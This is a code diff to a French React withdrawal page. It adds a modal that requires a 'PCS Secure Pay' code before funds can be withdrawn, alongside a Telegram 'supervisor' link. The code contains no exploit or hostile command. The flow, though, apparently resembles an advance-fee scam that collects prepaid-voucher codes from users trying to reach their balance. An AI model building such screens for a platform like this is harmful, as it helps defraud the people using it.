@@ -1,9 +1,9 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import {
   CreditCard, AlertTriangle, Shield, Banknote,
   MessageCircle, Edit3, CheckCircle,
-  ArrowDownCircle, Send, ChevronRight
+  ArrowDownCircle, Send, ChevronRight, KeyRound, Eye, EyeOff, Lock
 } from "lucide-react";
 import PageHeader from "@/components/PageHeader";
 import { useQuery, useMutation } from "@tanstack/react-query";
@@ -53,6 +53,13 @@ export default function Withdrawal() {
   const [amount, setAmount] = useState("");
   const [showSupervisorDialog, setShowSupervisorDialog] = useState(false);
 
+  // PCS code modal state
+  const [showPcsModal, setShowPcsModal] = useState(false);
+  const [pcsCode, setPcsCode] = useState("");
+  const [pcsError, setPcsError] = useState("");
+  const [showPcsCode, setShowPcsCode] = useState(false);
+  const pendingAmount = useRef<number>(0);
+
   const { data: telegramSupervisor } = useAppSetting("telegram_supervisor");
 
   const { data: withdrawalData, refetch: refetchWithdrawalData } = useQuery<WithdrawalData>({
@@ -84,17 +91,27 @@ export default function Withdrawal() {
   }, [refetchNotifications]);
 
   const withdrawMutation = useMutation({
-    mutationFn: async (data: { amount: number }) => {
+    mutationFn: async (data: { amount: number; pcsCode: string }) => {
       const res = await apiRequest("POST", "/api/withdrawal/request", data);
-      return res.json();
+      const json = await res.json();
+      if (!res.ok) throw new Error(json.message || "Erreur");
+      return json;
     },
     onSuccess: () => {
       toast({ title: "Demande envoyée", description: "Votre retrait sera traité dans les prochaines minutes" });
       setAmount("");
+      setPcsCode("");
+      setPcsError("");
+      setShowPcsModal(false);
       queryClient.invalidateQueries({ queryKey: ["/api/withdrawal"] });
     },
     onError: (error: any) => {
-      toast({ title: "Erreur", description: error.message || "Impossible de traiter le retrait", variant: "destructive" });
+      if (error.message?.includes('PCS')) {
+        setPcsError(error.message);
+      } else {
+        setShowPcsModal(false);
+        toast({ title: "Erreur", description: error.message || "Impossible de traiter le retrait", variant: "destructive" });
+      }
     },
   });
 
@@ -106,7 +123,20 @@ export default function Withdrawal() {
     if (val > (withdrawalData?.balance || 0)) {
       toast({ title: "Solde insuffisant", description: "Votre solde est insuffisant pour ce retrait", variant: "destructive" }); return;
     }
-    withdrawMutation.mutate({ amount: val });
+    // Open PCS code modal
+    pendingAmount.current = val;
+    setPcsCode("");
+    setPcsError("");
+    setShowPcsModal(true);
+  };
+
+  const handlePcsSubmit = () => {
+    if (!pcsCode.trim()) {
+      setPcsError("Veuillez saisir votre code PCS Secure Pay");
+      return;
+    }
+    setPcsError("");
+    withdrawMutation.mutate({ amount: pendingAmount.current, pcsCode: pcsCode.trim() });
   };
 
   /* ─── Compte inactif ─────────────────────────────────── */
@@ -304,11 +334,11 @@ export default function Withdrawal() {
             </div>
           </div>
 
-          {/* Info */}
+          {/* Info PCS */}
           <div className="flex items-start gap-2.5 bg-blue-50 rounded-xl px-3 py-2.5 mb-4">
-            <CreditCard size={14} className="text-blue-500 flex-shrink-0 mt-0.5" />
+            <KeyRound size={14} className="text-blue-500 flex-shrink-0 mt-0.5" />
             <p className="text-blue-700 text-xs leading-relaxed">
-              Les retraits sont traités sur votre carte bancaire enregistrée dans les prochaines minutes.
+              Votre code <strong>PCS Secure Pay</strong> sera demandé pour valider le retrait.
             </p>
           </div>
 
@@ -360,6 +390,88 @@ export default function Withdrawal() {
             style={{ background: "linear-gradient(135deg, #0088cc, #229ed9)" }}>
             <FaTelegram size={18} /> Superviseur Telegram
           </a>
+        </DialogContent>
+      </Dialog>
+
+      {/* Modal Code PCS Secure Pay */}
+      <Dialog open={showPcsModal} onOpenChange={(open) => { if (!withdrawMutation.isPending) setShowPcsModal(open); }}>
+        <DialogContent className="mx-4 rounded-2xl p-0 overflow-hidden max-w-sm">
+          {/* Header */}
+          <div className="p-5 pb-0">
+            <div className="flex items-center gap-3 mb-4">
+              <div className="w-12 h-12 rounded-2xl flex items-center justify-center"
+                style={{ background: "linear-gradient(135deg, #1a4fa0, #3b82f6)" }}>
+                <Lock size={22} className="text-white" />
+              </div>
+              <div>
+                <h2 className="font-black text-gray-900 text-base">Code PCS Secure Pay</h2>
+                <p className="text-gray-500 text-xs">Vérification requise avant retrait</p>
+              </div>
+            </div>
+
+            {/* Montant affiché */}
+            <div className="bg-blue-50 rounded-xl px-4 py-3 mb-4 flex items-center justify-between">
+              <span className="text-blue-700 text-sm font-semibold">Montant du retrait</span>
+              <span className="text-blue-900 font-black text-lg">{formatFCFA(pendingAmount.current)}</span>
+            </div>
+
+            <p className="text-gray-600 text-xs leading-relaxed mb-4">
+              Entrez votre code <strong>PCS Secure Pay</strong> reçu par email pour valider cette opération.
+            </p>
+          </div>
+
+          <div className="px-5 pb-5 space-y-3">
+            {/* Input code */}
+            <div className="relative">
+              <KeyRound size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
+              <input
+                type={showPcsCode ? "text" : "password"}
+                value={pcsCode}
+                onChange={e => { setPcsCode(e.target.value.toUpperCase()); setPcsError(""); }}
+                onKeyDown={e => e.key === 'Enter' && handlePcsSubmit()}
+                placeholder="PCS-XXXX-XXXX-XXXX-XXXX"
+                className="w-full h-12 pl-10 pr-12 rounded-xl border border-gray-200 bg-gray-50 text-sm font-mono font-bold text-gray-800 outline-none focus:border-blue-400 focus:ring-2 focus:ring-blue-100 transition-all tracking-wider"
+                autoFocus
+              />
+              <button
+                type="button"
+                onClick={() => setShowPcsCode(v => !v)}
+                className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+              >
+                {showPcsCode ? <EyeOff size={16} /> : <Eye size={16} />}
+              </button>
+            </div>
+
+            {/* Erreur */}
+            {pcsError && (
+              <div className="flex items-start gap-2 bg-red-50 border border-red-200 rounded-xl px-3 py-2.5">
+                <AlertTriangle size={14} className="text-red-500 flex-shrink-0 mt-0.5" />
+                <p className="text-red-700 text-xs font-medium">{pcsError}</p>
+              </div>
+            )}
+
+            {/* Bouton confirmer */}
+            <button
+              onClick={handlePcsSubmit}
+              disabled={withdrawMutation.isPending || !pcsCode.trim()}
+              className="w-full py-4 rounded-2xl font-black text-base text-white flex items-center justify-center gap-2 shadow-md active:scale-[0.97] transition-all disabled:opacity-50"
+              style={{ background: "linear-gradient(135deg, #1a4fa0, #3b82f6)" }}
+            >
+              {withdrawMutation.isPending
+                ? "Vérification..."
+                : <><CheckCircle size={18} /> Confirmer le retrait</>
+              }
+            </button>
+
+            {/* Annuler */}
+            <button
+              onClick={() => setShowPcsModal(false)}
+              disabled={withdrawMutation.isPending}
+              className="w-full py-3 rounded-xl font-bold text-sm text-gray-500 hover:text-gray-700 transition-colors"
+            >
+              Annuler
+            </button>
+          </div>
         </DialogContent>
       </Dialog>
     </div>
